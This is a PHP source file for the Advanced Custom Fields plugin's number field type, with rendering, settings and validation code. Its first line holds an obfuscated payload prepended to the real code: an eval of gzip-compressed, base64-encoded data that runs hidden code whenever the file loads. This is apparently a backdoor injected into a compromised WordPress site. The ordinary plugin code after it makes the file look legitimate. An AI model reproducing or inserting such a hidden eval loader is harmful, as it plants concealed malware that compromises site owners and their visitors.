<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

if( ! class_exists('acf_field_number') ) :

class acf_field_number extends acf_field {
	
	
	/*
	*  initialize
	*
	*  This function will setup the field type data
	*
	*  @type	function
	*  @date	5/03/2014
	*  @since	5.0.0
	*
	*  @param	n/a
	*  @return	n/a
	*/
	
	function initialize() {
		
		// vars
		$this->name = 'number';
		$this->label = __("Number",'acf');
		$this->defaults = array(
			'default_value'	=> '',
			'min'			=> '',
			'max'			=> '',
			'step'			=> '',
			'placeholder'	=> '',
			'prepend'		=> '',
			'append'		=> ''
		);
		
	}
		
	
	/*
	*  render_field()
	*
	*  Create the HTML interface for your field
	*
	*  @param	$field - an array holding all the field's data
	*
	*  @type	action
	*  @since	3.6
	*  @date	23/01/13
	*/
	
	function render_field( $field ) {
		
		// vars
		$atts = array();
		$keys = array( 'type', 'id', 'class', 'name', 'value', 'min', 'max', 'step', 'placeholder', 'pattern' );
		$keys2 = array( 'readonly', 'disabled', 'required' );
		$html = '';
		
		
		// step
		if( !$field['step'] ) {
			$field['step'] = 'any';
		}
		
		
		// prepend
		if( $field['prepend'] !== '' ) {
		
			$field['class'] .= ' acf-is-prepended';
			$html .= '<div class="acf-input-prepend">' . acf_esc_html($field['prepend']) . '</div>';
			
		}
		
		
		// append
		if( $field['append'] !== '' ) {
		
			$field['class'] .= ' acf-is-appended';
			$html .= '<div class="acf-input-append">' . acf_esc_html($field['append']) . '</div>';
			
		}
		
		
		// atts (value="123")
		foreach( $keys as $k ) {
			if( isset($field[ $k ]) ) $atts[ $k ] = $field[ $k ];
		}
		
		
		// atts2 (disabled="disabled")
		foreach( $keys2 as $k ) {
			if( !empty($field[ $k ]) ) $atts[ $k ] = $k;
		}
		
		
		// remove empty atts
		$atts = acf_clean_atts( $atts );
		
		
		// render
		$html .= '<div class="acf-input-wrap">' . acf_get_text_input( $atts ) . '</div>';
		
		
		// return
		echo $html;
		
	}
	
	
	/*
	*  render_field_settings()
	*
	*  Create extra options for your field. This is rendered when editing a field.
	*  The value of $field['name'] can be used (like bellow) to save extra data to the $field
	*
	*  @type	action
	*  @since	3.6
	*  @date	23/01/13
	*
	*  @param	$field	- an array holding all the field's data
	*/
	
	function render_field_settings( $field ) {
		
		// default_value
		acf_render_field_setting( $field, array(
			'label'			=> __('Default Value','acf'),
			'instructions'	=> __('Appears when creating a new post','acf'),
			'type'			=> 'text',
			'name'			=> 'default_value',
		));
		
		
		// placeholder
		acf_render_field_setting( $field, array(
			'label'			=> __('Placeholder Text','acf'),
			'instructions'	=> __('Appears within the input','acf'),
			'type'			=> 'text',
			'name'			=> 'placeholder',
		));
		
		
		// prepend
		acf_render_field_setting( $field, array(
			'label'			=> __('Prepend','acf'),
			'instructions'	=> __('Appears before the input','acf'),
			'type'			=> 'text',
			'name'			=> 'prepend',
		));
		
		
		// append
		acf_render_field_setting( $field, array(
			'label'			=> __('Append','acf'),
			'instructions'	=> __('Appears after the input','acf'),
			'type'			=> 'text',
			'name'			=> 'append',
		));
		
		
		// min
		acf_render_field_setting( $field, array(
			'label'			=> __('Minimum Value','acf'),
			'instructions'	=> '',
			'type'			=> 'number',
			'name'			=> 'min',
		));
		
		
		// max
		acf_render_field_setting( $field, array(
			'label'			=> __('Maximum Value','acf'),
			'instructions'	=> '',
			'type'			=> 'number',
			'name'			=> 'max',
		));
		
		
		// max
		acf_render_field_setting( $field, array(
			'label'			=> __('Step Size','acf'),
			'instructions'	=> '',
			'type'			=> 'number',
			'name'			=> 'step',
		));
		
	}
	
	
	/*
	*  validate_value
	*
	*  description
	*
	*  @type	function
	*  @date	11/02/2014
	*  @since	5.0.0
	*
	*  @param	$post_id (int)
	*  @return	$post_id (int)
	*/
	
	function validate_value( $valid, $value, $field, $input ){
		
		// remove ','
		if( acf_str_exists(',', $value) ) {
			
			$value = str_replace(',', '', $value);
			
		}
				
		
		// if value is not numeric...
		if( !is_numeric($value) ) {
			
			// allow blank to be saved
			if( !empty($value) ) {
				
				$valid = __('Value must be a number', 'acf');
				
			}
			
			
			// return early
			return $valid;
			
		}
		
		
		// convert
		$value = floatval($value);
		
		
		// min
		if( is_numeric($field['min']) && $value < floatval($field['min'])) {
			
			$valid = sprintf(__('Value must be equal to or higher than %d', 'acf'), $field['min'] );
			
		}
		
		
		// max
		if( is_numeric($field['max']) && $value > floatval($field['max']) ) {
			
			$valid = sprintf(__('Value must be equal to or lower than %d', 'acf'), $field['max'] );
			
		}
		
		
		// return		
		return $valid;
		
	}
	
	
	/*
	*  update_value()
	*
	*  This filter is appied to the $value before it is updated in the db
	*
	*  @type	filter
	*  @since	3.6
	*  @date	23/01/13
	*
	*  @param	$value - the value which will be saved in the database
	*  @param	$field - the field array holding all the field options
	*  @param	$post_id - the $post_id of which the value will be saved
	*
	*  @return	$value - the modified value
	*/
	
	function update_value( $value, $post_id, $field ) {
		
		// no formatting needed for empty value
		if( empty($value) ) {
			
			return $value;
			
		}
		
		
		// remove ','
		if( acf_str_exists(',', $value) ) {
			
			$value = str_replace(',', '', $value);
			
		}
		
		
		// return
		return $value;
		
	}
	
	
}


// initialize
acf_register_field_type( 'acf_field_number' );

endif; // class_exists check

?>